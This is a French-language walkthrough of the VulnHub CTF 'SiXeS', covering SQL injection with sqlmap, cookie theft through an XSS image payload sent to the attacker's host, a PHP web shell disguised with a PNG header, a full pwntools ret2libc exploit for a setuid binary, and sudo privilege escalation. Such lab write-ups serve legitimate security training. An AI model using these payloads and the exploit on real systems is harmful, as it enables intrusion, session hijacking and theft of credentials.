---
title: "Solution du CTF SiXeS de VulnHub"
tags: [VulnHub, CTF, binary exploitation]
---



[SiXeS](https://vulnhub.com/entry/sixes-1,380/) est un CTF créé par [Hafidh ZOUAHI](https://medium.com/@0x000c0ded) et disponible sur _VulnHub_. Il est assez difficile, car il y a une exploitation de binaire moderne (c'est-à-dire `ASLR` et `NX` sont présents sur un binaire 64 bits).

Il est aussi un peu compliqué dans le sens où une vulnérabilité présente laisse supposer que l'on doit suivre un scénario très classique, mais il s'agit en réalité d'une impasse. Une autre vulnérabilité permet d'obtenir le même accès.

## OnEs

La VM dispose de 3 ports ouverts :

```
Nmap scan report for 192.168.56.145
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Le serveur FTP accepte les connexions anonymes. On y trouve un fichier `note.txt` avec le contenu suivant :

```
DONE:
  - Develop the web application frontend and backend
  - Add a firewall to block malicious tools

TODO:
  - Hire a Pentester to secure the web application
  - Buy food to my cat :3

shellmates{5c6b5e84ab3fa94257bdce66b9c1c200}
```

Le serveur web quant à lui délivre un site sur le thème de *Team Fortress 2*. C'est grosso modo un blog avec 3 entrées. Il y a aussi une page about, une page contact et une page de login *Restricted Area*.

Le site semble lent ce qui est en réalité probablement lié au firewall mentionné.

On peut lancer wapiti sur le site de cette façon :

```bash
wapiti -u http://192.168.56.145/ --color
```

Et on trouve une faille d'injection SQL :

```
[*] Launching module sql
---
SQL Injection in http://192.168.56.145/ via injection in the parameter id
Evil request:
    GET /?page=post.php&id=1%20AND%2011%3D11%20AND%2034%3D34 HTTP/1.1
    host: 192.168.56.145
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: PHPSESSID=phije36odt897s1tl7sq4hrorh
---
```

## TwOeS

On peut sortir l'artillerie lourde pour extraire les données de la base, mais il faut prendre soin de spécifier un délai d'au moins une seconde entre chaque requête sans quoi le firewall nous mettra en échec.

L'option `--string` de `sqlmap` permet de définir quelle chaine de caractère doit être présente dans la page pour considérer que la requête correspond au booléen `true`.

Ici `amazing` est un mot qui n'apparait que dans le post numéro 3 du blog donc c'est un parfait candidat.

```bash
python sqlmap.py -u "http://192.168.56.145/?page=post.php&id=3" -p id --dbms mysql --risk 3 --level 5 --string amazing --delay 1
```

`sqlmap` identifie bien la vulnérabilité `boolean-based blind` et aussi le fait qu'il peut se servir du mot clé `UNION` :

```
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=post.php&id=3 AND 6680=6680

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=post.php&id=3 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))qsOs)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: page=post.php&id=-2943 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706271,0x6d5063774644786f6748466b796e796843514b7071767977746b774a437a465543416e6a5344734e,0x71706b6271)-- -
---
[22:54:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
```

L'option `--current-user` indique que les requêtes sont faites avec l'utilisateur `root`. On peut donc extraire les hashes avec `--passwords`.

```
database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *2C079DA8224260B39D7D63F1701B47BB63126787
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: *AC0F97FFD5E98FD05553857CC0EA1125FD3D6761
```

On continue de dumper. Il y a trois tables dans la base courante :

```
Database: sixes
[3 tables]
+--------------------+
| articles           |
| s3cr3t_t4ble_31337 |
| users              |
+--------------------+
```

On trouve un autre flag :

```
Database: sixes
Table: s3cr3t_t4ble_31337
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| shellmates{69f78fa6e9f49d180d145553ceecf87d} |
+----------------------------------------------+
```

Mais surtout le hash du compte `webmaster` pour la zone authentifiée.

```
Database: sixes
Table: users
[1 entry]
+-------+-----------+----------------------------------+
| role  | username  | password                         |
+-------+-----------+----------------------------------+
| admin | webmaster | c78180d394684c07d6d87b291d8fe533 |
+-------+-----------+----------------------------------+
```

Malheureusement aucun des hashes n'est trouvé sur *crackstation*.

J'ai tenté de casser ce hash MD5 avec *JtR* et la wordlist *rockyou* sans succès. J'ai aussi essayé des dérivés de hashage (du type double ou triple hashage MD5) mais ça n'a mené nulle part.

## TrEeS

La page `contact.php` indique que l'on peut soumettre un feedback pour signaler une page du site défectueuse et que la team derrière le site va regarder ça rapidement. Ça sent donc la simulation de XSS.

J'ai créé la page HTML suivante :

```html
<html>
    <body>
        <script>var img = document.createElement("img"); img.src = "http://192.168.56.1:7777/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
```

Puis j'ai rempli le formulaire :

![VulnHUb SiXeS CTF form vulnerable to XSS](/assets/img/vulnhub/sixes_xss_vulnerable_form.png)

Il n'a pas fallu longtemps avec d'avoir un retour :

```console
$ python3 -m http.server 7777
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
192.168.56.145 - - [30/Mar/2023 22:23:04] "GET / HTTP/1.1" 200 -
192.168.56.145 - - [30/Mar/2023 22:23:05] "GET /?PHPSESSID=1gg9pj4c487nr2pame21r7uksa HTTP/1.1" 200 -
```

J'utilise l'extension `EditThisCookie` dans *Chrome* qui fait largement le job. Une fois le cookie injecté dans le navigateur je peux me rendre sur la page `admin.php`.

## FoUrEs

Cette page est un simple formulaire d'upload. Sans trop de surprises si on tente d'uploader directement du PHP on obtient un message d'erreur :

> File not allowed. Only jpeg, jpg and png are allowed.

J'utilise ma méthode habituelle qui consiste juste à placer un entête PNG avant le shell PHP :

```bash
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.php
```

Cette fois l'upload est accepté et je peux rapatrier mes outils habituels pour continuer l'exploration.

Je note la présence du compte `webmaster` :

```
webmaster:x:1000:1000:0x000c0ded:/home/webmaster:/bin/bash
```

Il dispose de différents fichiers, mais en particulier un binaire setuid nommé `notemaker` :

```console
www-data@sixes:/var/www/html$ find / -user webmaster -type f -ls 2> /dev/null 
   407356      4 -rw-------   1 webmaster webmaster       43 Oct  3  2019 /home/webmaster/.lesshst
   413951      4 -r--------   1 webmaster webmaster       45 Oct  4  2019 /home/webmaster/user.txt
   407195      4 -rw-rw-r--   1 webmaster webmaster       75 Oct  3  2019 /home/webmaster/.selected_editor
   407357      4 -rw-------   1 webmaster webmaster      377 Mar 29 08:57 /home/webmaster/notes.txt
   407035      4 -rw-r--r--   1 webmaster webmaster      807 Apr  4  2018 /home/webmaster/.profile
   413913     16 -rw-------   1 webmaster webmaster    14748 Oct  5  2019 /home/webmaster/.viminfo
   407036      4 -rw-r--r--   1 webmaster webmaster      220 Apr  4  2018 /home/webmaster/.bash_logout
   407037      4 -rw-r--r--   1 webmaster webmaster     3771 Apr  4  2018 /home/webmaster/.bashrc
      628     20 -r-sr-sr-x   1 webmaster webmaster    17320 Oct  3  2019 /sbin/notemaker
   157099      4 -rw-rw-r--   1 webmaster webmaster     3242 Oct  5  2019 /var/www/html/contact.php
   134353      4 -rw-rw-r--   1 webmaster webmaster     1390 Oct  4  2019 /var/www/html/post.php
   131615      4 -rw-rw-r--   1 webmaster webmaster     3727 Oct  4  2019 /var/www/html/home.php
   134358      4 -rw-rw-r--   1 webmaster webmaster     2987 Oct  4  2019 /var/www/html/index.php
   157100      4 -rw-rw-r--   1 webmaster webmaster     2897 Mar 29 08:40 /var/www/html/admin.php
   134356      4 -rw-rw-r--   1 webmaster webmaster     1271 Oct  4  2019 /var/www/html/about.php
   131601      4 -rw-rw-r--   1 webmaster webmaster      119 Oct  4  2019 /var/www/html/config.php
```

## FiVeS

Sans trop de surprises le programme est vulnérable à un stack overflow :

```console
www-data@sixes:/var/www/html$ /sbin/notemaker
.---------------- Simple Note Maker v1.0 ----------------.
|                                                        |
|    Use this program to leave me some notes, and I'll   |
|                check them when I'm free!               |
|          (Because I'm a busy webmaster, hehe)          |
| Also, keep your notes below 256 bytes so I can easily  |
|                      Read them :)                      |
|             - 0x000c0ded, your webmaster.              |
`--------------------------------------------------------'
Start typing >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
www-data@sixes:/var/www/html$ dmesg | tail -2
[ 1691.094414] traps: notemaker[2441] trap invalid opcode ip:401401 sp:7ffdd8655690 error:0 in notemaker[401000+1000]
[ 1717.094451] notemaker[2446]: segfault at 41414141 ip 0000000041414141 sp 00007ffe906b14f0 error 14 in libc-2.27.so[7f040bd12000+1e7000]
```

Comme dit en intro le binaire dispose du flag `NX` donc on ne peut pas bêtement faire exécuter un shellcode sur la stack. On va par conséquent faire du _Return Oriented Programming_ mais comme l'`ASLR` est actif il faut d'abord que l'on fasse fuiter l'adresse d'une fonction de la libc. Cette adresse nous permettra alors de calculer l'adresse de la fonction `system` car la distance entre deux fonctions de la libc ne change pas.

`gdb` n'est pas présent sur la VM donc tous les préparatifs sont à effectuer d'abord en local.

Je récupère d'abord l'adresse de `puts` ainsi que son entrée dans la `GOT` :

```console
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x401050 <puts@plt>
gdb-peda$ x/2i 0x401050
   0x401050 <puts@plt>: jmp    QWORD PTR [rip+0x2fd2]        # 0x404028 <puts@got[plt]>
   0x401056 <puts@plt+6>:       push   0x2
```

À l'exécution, l'adresse dans la `GOT` (`0x404028`) contiendra la véritable adresse de `puts` une fois que le loader aura chargé la libc. L'adresse `0x401050` peut être considérée comme une sorte de shortcut.

Notre objectif est de faire exécuter `puts(puts@got[plt])` pour faire afficher l'adresse à l'écran.

Toutefois, on ne peut pas simplement placer les deux adresses dans un payload comme on l'aurait fait en 32 bits :

```python
from struct import pack
open("/tmp/input", "wb").write(b"A" * 280 + pack("<qq", 0x401050, 0x404028))
```

En effet, la convention d'appel des fonctions en `x86_64` requiert que le premier argument soit stocké dans le registre `rdi`.

Dans le binaire, on peut trouver (via `ROPgadget`) l'instruction suivante :

```
0x00000000004014eb : pop rdi ; ret
```

On va fonc écraser l'adresse de retour par celle du gadget qui récupérera l'argument sur la stack (`puts@got[plt]`) et sautera sur l'adresse de `puts` qu'on aura placé ensuite, donc :

```
AAAAAAAA... 0x4014eb 0x404028 0x401050
```

Une fois qu'on aura lu l'adresse depuis la sortie du programme il faut donc calculer les adresses nécessaires (`system` et `/bin/sh`) à un nouveau ROP et les redonner au binaire dans le même flot d'exécution...

Comment ? Une technique souvent employée et de forcer le programme à revenir à la première instruction du `main`. On peut alors abuser du même stack overflow une seconde fois pour la charge finale.

On peut déjà tester cette partie en générant les octets à envoyer :

```python
from struct import pack
open("/tmp/input", "wb").write(b"A" * 280 + pack("<qqqq", 0x4014eb, 0x404028, 0x401050, 0x401370))
```

Et on note bien la double exécution :

```console
$ cat input | ./notemaker
.---------------- Simple Note Maker v1.0 ----------------.
|                                                        |
|    Use this program to leave me some notes, and I'll   |
|                check them when I'm free!               |
|          (Because I'm a busy webmaster, hehe)          |
| Also, keep your notes below 256 bytes so I can easily  |
|                      Read them :)                      |
|             - 0x000c0ded, your webmaster.              |
`--------------------------------------------------------'
Start typing >> ��
�

.---------------- Simple Note Maker v1.0 ----------------.
|                                                        |
|    Use this program to leave me some notes, and I'll   |
|                check them when I'm free!               |
|          (Because I'm a busy webmaster, hehe)          |
| Also, keep your notes below 256 bytes so I can easily  |
|                      Read them :)                      |
|             - 0x000c0ded, your webmaster.              |
`--------------------------------------------------------'
Start typing >> [+] Your note has been saved! Thank you :d
Erreur de segmentation (core dumped)
```

On voit des caractères étranges dans l'output qui correspondent à l'adresse de `puts` de la libc que l'on fait fuiter.

Lire les octets depuis le `pty` est compliqué, mais pas impossible (voir [Solution du CTF Xerxes 2]({% link _posts/2014-08-14-Solution-du-CTF-Xerxes-2.md %}#exploitation-de-la-chaîne-de-format-2nd-cas--dialogue-avec-mon-tty).

Je ne souhaite toutefois pas remettre les pieds dans cette technique et une bonne solution pour éviter les problèmes de bufferisation consiste à faire passer les entrées/sorties du programme sur le réseau. On le lancera donc de cette façon :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/sbin/notemaker 2>&1|nc -lp 31337 >/tmp/f
```

Avantages :

- le binaire n'est pas lancé depuis le débogueur donc pas de corrections à faire dû à un environnement qui change (en contrepartie il faut s'attacher au process pour déboguer).

- l'exploitation locale sera en tout point identique à celle sur la VM sauf que les adresses mémoires seront calculées autrement.

D'ailleurs, en parlant d'adresses, on peut obtenir les offsets des fonctions de la libc de cette façon (ici sur ma machine) :

```console
$ nm /usr/lib64/libc.so.6
0000000000079e9e W puts
000000000004f2ee W system
```

Et sur la VM la commande change un peu :

```console
$ nm -D /lib/x86_64-linux-gnu/libc-2.27.so
00000000000809c0 W puts
000000000004f440 W system
```

Bien sûr j'ai tronqué l'output qui est bien plus important.

Et pour obtenir l'adresse de `/bin/sh` (l'adresse sera différente sur la libc de la VM) :

```console
$ strings -t x -a /lib64/libc.so.6 | grep "/bin/sh"
 1a8060 /bin/sh
```

J'ai écrit l'exploit suivant qui utilise `pwntools` pour faciliter la partie réseau :

```python
import sys
from struct import pack, unpack

from pwnlib.tubes.remote import remote

ip = "127.0.0.1"
port = 31337
PUTS_OFFSET = 0x79e9e
SYSTEM_OFFSET = 0x4f2ee
BIN_SH_OFFSET = 0x1a8060

POP_RDI = 0x4014eb  # pop rdi ; ret
PUTS = 0x401050
PUTS_PLT = 0x404028
MAIN = 0x401370

buffer = b"A" * 280
buffer += pack("<q", POP_RDI)
buffer += pack("<q", PUTS_PLT)
buffer += pack("<q", PUTS)
buffer += pack("<q", MAIN)


r = remote(ip, port)
r.recvuntil(b"Start typing >>")
r.send(buffer + b"\n")
data = r.recvuntil(b"\n.---------------- Simple Note Maker v1.0 ----------------.\n")
puts_libc = unpack("<q", data[1:7].ljust(8, b"\x00"))[0]
print("Got puts@libc address:", hex(puts_libc))
base_libc = puts_libc - PUTS_OFFSET
system_libc = base_libc + SYSTEM_OFFSET
sh_libc = base_libc + BIN_SH_OFFSET
print("Got system@libc address:", hex(system_libc))
print("Got /bin/sh@libc address:", hex(sh_libc))

r.recvuntil(b"Start typing >>")
input("enter to continue")
buffer = b"A" * 280
buffer += pack("<q", POP_RDI)
buffer += pack("<q", sh_libc)
buffer += pack("<q", system_libc)
r.send(buffer + b"\n")
r.interactive()

r.close()
```

Seulement à l'exécution... c'est le crash. Et à un emplacement inattendu :

```
gdb-peda$ c
Continuing.
[Attaching after Thread 0x7f2692f06740 (LWP 8830) vfork to child process 8885]
[New inferior 2 (process 8885)]
[Thread debugging using libthread_db enabled]
[----------------------------------registers-----------------------------------]
RAX: 0x7fa606fb58c0 --> 0x7ffdebe76918 --> 0x7ffdebe77f20 ("SHELL=/bin/bash")
RBX: 0x7ffdebe76668 --> 0xc ('\x0c')
RCX: 0x7ffdebe76668 --> 0xc ('\x0c')
RDX: 0x0 
RSI: 0x7fa606f6a060 --> 0x68732f6e69622f ('/bin/sh')
RDI: 0x7ffdebe76464 --> 0x0 
RBP: 0x7ffdebe764c8 --> 0x0 
RSP: 0x7ffdebe76458 --> 0x0 
RIP: 0x7fa606e10fb3 (<do_system+341>:   movaps XMMWORD PTR [rsp+0x50],xmm0)
R8 : 0x7ffdebe764a8 --> 0x10972c0 --> 0x1097 
R9 : 0x7ffdebe76918 --> 0x7ffdebe77f20 ("SHELL=/bin/bash")
R10: 0x8 
R11: 0x246 
R12: 0x7fa606f6a060 --> 0x68732f6e69622f ('/bin/sh')
R13: 0x7ffdebe76918 --> 0x7ffdebe77f20 ("SHELL=/bin/bash")
R14: 0x0 
R15: 0x7fa607012000 --> 0x7fa606fdc000 --> 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7fa606e10fa4 <do_system+326>:      mov    QWORD PTR [rsp+0x60],r12
   0x7fa606e10fa9 <do_system+331>:      mov    r9,QWORD PTR [rax]
   0x7fa606e10fac <do_system+334>:      lea    rsi,[rip+0x1590ad]        # 0x7fa606f6a060
=> 0x7fa606e10fb3 <do_system+341>:      movaps XMMWORD PTR [rsp+0x50],xmm0
   0x7fa606e10fb8 <do_system+346>:      mov    QWORD PTR [rsp+0x68],0x0
   0x7fa606e10fc1 <do_system+355>:      call   0x7fa606ec2dce <posix_spawn@@GLIBC_2.15>
   0x7fa606e10fc6 <do_system+360>:      mov    rdi,rbx
   0x7fa606e10fc9 <do_system+363>:      mov    r12d,eax
[------------------------------------stack-------------------------------------]
0000| 0x7ffdebe76458 --> 0x0 
0008| 0x7ffdebe76460 --> 0xffffffff 
0016| 0x7ffdebe76468 --> 0x0 
0024| 0x7ffdebe76470 --> 0x0 
0032| 0x7ffdebe76478 --> 0x7fa606e690c2 (<__strstr_generic+68>: mov    r13,rax)
0040| 0x7ffdebe76480 --> 0x1099d22 --> 0x0 
0048| 0x7ffdebe76488 --> 0x1099d22 --> 0x0 
0056| 0x7ffdebe76490 --> 0x109abf0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007fa606e10fb3 in do_system () from /lib64/libc.so.6
```

Donc on voit qu'on est bien entré dans `system` et même qu'un fork (`New inferior`) a eu lieu en revanche l'exécution de bash s'est terminé à cause d'une instruction `movaps`.

En cherchant un peu sur le web, on découvre que c'est un problème connu pour l'exploitation de binaire qui vient du fait que l'instruction `movaps` veut que `rsp` soit aligné sur une adresse multiple de 16 octets :

[x86 - libc's system() when the stack pointer is not 16-padded causes segmentation fault - Stack Overflow](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul)

Par conséquent, au lieu d'utiliser un gadget `pop-ret` comme je le faisais je vais employer un gadget `pop-pop-ret` qui va décaler `rsp` de 8 octets supplémentaires et sera du coup un multiple de 16 (j'avais une chance sur deux de tomber juste).

Il n'y a pas de gadget pour `pop rdi ; pop <reg> ; ret` dans le binaire, mais il y a un `pop rdi ; pop rbp ; ret` présent dans ma libc et celle de la VM. Il faut juste penser à calculer l'adresse comme on le fait pour `system` et `/bin/sh`.

L'exploit final est le suivant :

```python
import sys
from struct import pack, unpack

from pwnlib.tubes.remote import remote

if sys.argv[1] == "local":
    ip = "127.0.0.1"
    port = 31337
    PUTS_OFFSET = 0x79e9e
    SYSTEM_OFFSET = 0x4f2ee
    BIN_SH_OFFSET = 0x1a8060
    # prevent crash in do_system
    POP_RDI_RBP_OFFSET = 0x284a2  # pop rdi ; pop rbp ; ret
else:
    ip = "192.168.56.145"
    port = 31337
    PUTS_OFFSET = 0x809c0
    SYSTEM_OFFSET = 0x4f440
    BIN_SH_OFFSET = 0x1b3e9a
    # prevent crash in do_system
    POP_RDI_RBP_OFFSET = 0x221a3  # pop rdi ; pop rbp ; ret

POP_RDI = 0x4014eb  # pop rdi ; ret
PUTS = 0x401050
PUTS_PLT = 0x404028
MAIN = 0x401370

buffer = b"A" * 280
buffer += pack("<q", POP_RDI)
buffer += pack("<q", PUTS_PLT)
buffer += pack("<q", PUTS)
buffer += pack("<q", MAIN)


r = remote(ip, port)
r.recvuntil(b"Start typing >>")
r.send(buffer + b"\n")
data = r.recvuntil(b"\n.---------------- Simple Note Maker v1.0 ----------------.\n")
puts_libc = unpack("<q", data[1:7].ljust(8, b"\x00"))[0]
print("Got puts@libc address:", hex(puts_libc))
base_libc = puts_libc - PUTS_OFFSET
system_libc = base_libc + SYSTEM_OFFSET
sh_libc = base_libc + BIN_SH_OFFSET
print("Got system@libc address:", hex(system_libc))
print("Got /bin/sh@libc address:", hex(sh_libc))

r.recvuntil(b"Start typing >>")
# input("enter to continue")
buffer = b"A" * 280
buffer += pack("<q", base_libc + POP_RDI_RBP_OFFSET)
buffer += pack("<q", sh_libc)
buffer += pack("<q", 0xdeadbeef)
buffer += pack("<q", system_libc)
r.send(buffer + b"\n")
r.interactive()

r.close()
```

Et ça fonctionne :

```console
$ python3 exploit.py remote
Got puts@libc address: 0x7f9de966d9c0
Got system@libc address: 0x7f9de963c440
Got /bin/sh@libc address: 0x7f9de97a0e9a
 id
uid=1000(webmaster) gid=1000(webmaster) groups=1000(webmaster),33(www-data)
cd /home/webmaster
ls  
low_user.txt
notes.txt
user.txt
cat user.txt
shellmates{96a683b3d9aa80d53066eea68995f317}
```

## SiXeS

Je ne m'éternise pas sur ce shell, je m'empresse de rajouter une entrée à `authorized_keys`, puis je me connecte au compte. L'utilisateur peut lancer la commande `service` avec les droits root :

```console
www-data@sixes:/var/www/html/$ ssh -i /tmp/key_no_pass webmaster@127.0.0.1
Could not create directory '/var/www/.ssh'.

webmaster@sixes:~$ sudo -l
Matching Defaults entries for webmaster on sixes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webmaster may run the following commands on sixes:
    (root) NOPASSWD: /usr/sbin/service
```

Il y a un _GTFObin_ pour le programme que l'on a déjà exploité sur le [CTF Five86-2]({% link _posts/2023-03-26-Solution-du-CTF-Five86-2-de-VulnHub.md %}).

```console
webmaster@sixes:~$ sudo /usr/sbin/service ../../bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
firewall  root.txt  xss_simulator
# cat root.txt
shellmates{fa7b27528914d9ca504c9c281648c418}
```

## Making-of

Voici quelques scripts tirés du CTF. D'abord le firewall qui est un script qui lit les lignes de log d'Apache et DROP les paquets des IPs émettant trop de requêtes sur un laps de temps choisit :

```bash
#!/bin/bash
# Author: ZOUAHI Hafidh (0x000c0ded)
# A simple home made firewall to block the usage of
#  automated tools during CTFs, such as SQLmap,
#  Dirbuster, and other bruteforcing tools.

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"

this_ip="$(ifconfig enp0s3 | awk '/inet / {print $2}' | tr -d '\n')"
path="/root/firewall/logs"
log_file="/root/firewall/firewall.log"
banned_ips=""
last_unban="$(date +%s)"
unban_interval=60
n_req=15
n_sec=3
rm -f $log_file
rm -r $path
mkdir $path
> /var/log/apache2/access.log
tail -f /var/log/apache2/access.log | while read line; do
  # Check if 60 seconds have passed since the last unban
  curr_time="$(date +%s)"
  if [[ "$((curr_time - last_unban))" -ge "$unban_interval" ]]; then
    iptables -F INPUT
    [ -z "$banned_ips" ] || echo "~-> $(date '+%Y:%m:%d %H:%M:%S'): Unbanning $banned_ips" >> $log_file
    banned_ips=""
    last_unban="$curr_time"
  fi
  ip_addr=$(echo "$line" | cut -d ' ' -f1)
  timestamp=$(date --date="$(echo "$line" | tr ' ' ':' | cut -d ':' -f5-7)" +%s)
  if [[ ! "$banned_ips" =~ "$ip_addr" ]] && test -f "$path/$ip_addr"; then
    req_num=$(cat "$path/$ip_addr" | cut -d ' ' -f1)
    req_num=$((req_num + 1))
    old_timestamp=$(cat "$path/$ip_addr" | cut -d ' ' -f2)
    # Check if at least $n_req requests were made within $n_sec seconds
    if [ "$ip_addr" != "$this_ip" ] && [[ "$((timestamp - old_timestamp))" -le $n_sec ]] && [[ $req_num -ge $n_req ]]; then
      # Ban this IP if it's not our IP
      iptables -A INPUT -s "$ip_addr" -p tcp --dport 80 -j DROP
      echo "~-> $(date '+%Y:%m:%d %H:%M:%S'): Banned $ip_addr for up to 60 seconds." >> $log_file
      banned_ips="${banned_ips}$ip_addr "
      rm "$path/$ip_addr"
    elif [[ "$((timestamp - old_timestamp))" -gt $n_sec ]] && [[ $req_num -lt $n_req ]]; then
      # Reset counters
      echo -n "1 $timestamp" > "$path/$ip_addr"
    else
      # Update counters
      echo -n "$req_num $old_timestamp" > "$path/$ip_addr"
    fi
  else
    # Create the file for the first time
    echo -n "1 $timestamp" > "$path/$ip_addr"
  fi
done
```

Ensuite on a le script qui simule un utilisateur pour la faille XSS (`chromium` + `pyppeteer`) :

```python
#!/usr/bin/python3
import requests
import asyncio
import sys
from pyppeteer import launch

url  = 'http://127.0.0.1/admin.php'
user = 'webmaster'
pswd = '6a1eE8X81t3uwsiKqrT5Atf38tkCS6Eh'
data = {'login': user, 'password': pswd}

response = requests.post(url=url, data=data)
cookie = response.request.headers['Cookie'].split('=')
urls = [i.strip() for i in open('/root/xss_simulator/urls.txt').readlines()]

async def main():
    browser = await launch({"executablePath":"/usr/bin/chromium-browser"}, args=['--no-sandbox'])
    page = await browser.newPage()
    for url in urls:
        await page.setCookie({'url': url, 'name': cookie[0], 'value': cookie[1]})
        await page.goto(url)
    await asyncio.sleep(10)
    await browser.close()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()
```

Et finalement les quelques lignes de la crontab de root :

```
  * *   *   *   *    echo "MjAxOS0xMC0wMiAyMTowODowNSB+LT4gcm9vdCBzYWlkOiBIZXkgd2VibWFzdGVyLCBpbiBjYXNlIHRoZSB3ZWIgc2VydmVyIGdvZXMgZG93biwgSSBnYXZlIHlvdSBzb21lIHByaXZpbGVnZXMgc28geW91IGNhbiBzdGFydC9zdG9wL3Jlc3RhcnQgaXQgd2hlbmV2ZXIgeW91IHdhbnQuIENoZWVycy4KMjAxOS0xMC0wMiAyMTowODozMyB+LT4gcm9vdCBzYWlkOiBIZXkgYWdhaW4sIGhvdyBtYW55IHRpbWVzIHNob3VsZCBJIHJlcGVhdCB0aGF0IFlPVSBTSE9VTEQgTkVWRVIgVVNFIEdFVFM/IFNlcmlvdXNseSwgZXZlbiB0aGUgY29tcGlsZXIgcmVtaW5kcyB5b3UuLi4gR28gZml4IGl0IG5vdyBvciBJJ2xsIGRlbGV0ZSB5b3VyIG1pbmVjcmFmdCBhY2NvdW50Lgo=" | base64 -d > /home/webmaster/notes.txt && chown webmaster /home/webmaster/notes.txt && chgrp webmaster /home/webmaster/notes.txt && chmod 600 /home/webmaster/notes.txt
  * *   *   *   *    [ -z "$(pgrep firewall.sh)" ] && /root/firewall/firewall.sh
  * *   *   *   *    /usr/bin/curl http://localhost/
  * *   *   *   *    [ -f /var/www/html/img/Sp3c1al_d3l1V3ry.txt ] && /bin/cp /var/www/html/img/Sp3c1al_d3l1V3ry.txt /root/xss_simulator/urls.txt && /bin/rm -f /var/www/html/img/Sp3c1al_d3l1V3ry.txt && /root/xss_simulator/xss_trigger.py && /bin/rm /root/xss_simulator/urls.txt
```

C'était un CTF intéressant où j'ai découvert comment passer outre le sigsev sur `movaps`.
